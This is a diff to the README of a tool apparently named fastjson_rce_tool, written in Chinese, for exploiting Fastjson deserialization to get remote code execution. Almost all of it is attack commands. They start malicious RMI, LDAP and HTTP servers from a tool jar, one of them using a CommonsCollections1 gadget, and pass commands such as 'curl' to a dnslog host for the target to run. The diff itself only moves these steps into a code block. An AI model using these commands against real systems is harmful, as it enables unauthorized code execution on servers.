@@ -1,18 +1,22 @@
 # fastjson_rce_tool
 
+```
+1. 启动RMI服务
 
-1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
 java -cp fastjson_tool.jar EvilRMIServer 8888 53 "curl dnslog.wyzxxz.cn"
 
-2. 启动LDAP服务，后面写要执行的语句
+2. 启动LDAP服务
+
 java -cp fastjson_tool.jar LDAPRefServer2 8888 CommonsCollections1 "curl dnslog.wyzxxz.cn"
 
-3. 启动ldap服务，从http服务获取class
+3. 启动ldap服务2
+
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
 4. 启动http服务器
-java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 80
 
+java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 80
+```
 
 
 ```
